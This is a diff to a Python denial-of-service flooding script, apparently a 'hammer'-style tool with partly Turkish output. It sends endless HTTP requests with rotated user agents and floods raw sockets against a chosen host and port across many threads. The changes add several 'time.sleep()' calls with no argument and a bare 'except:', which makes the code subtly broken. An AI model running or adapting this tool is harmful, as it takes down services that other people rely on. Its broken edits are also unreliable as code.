@@ -23,6 +23,10 @@ def bot_hammering(url):
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
+			time.sleep()
+	except:
+		time.sleep()
+
 
 def down_it(item):
 	try:
@@ -36,6 +40,7 @@ def down_it(item):
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
+			time.sleep()
 	except socket.error as e:
 		print("\033[91mno Bağlantı kurulamıyor! \033[0m")
 		print("\033[91m",e,"\033[0m")
@@ -115,6 +120,7 @@ if __name__ == '__main__':
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
 	print("\033[94m Lütfen bekleyiniz...\033[0m")
 	user_agent()
+	time.sleep()
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
@@ -136,6 +142,7 @@ if __name__ == '__main__':
 		while True:
 			if (item>1): # for no memory crash
 				item=0
+				time.sleep()
 			item = item + 1
 			q.put(item)
 			w.put(item)
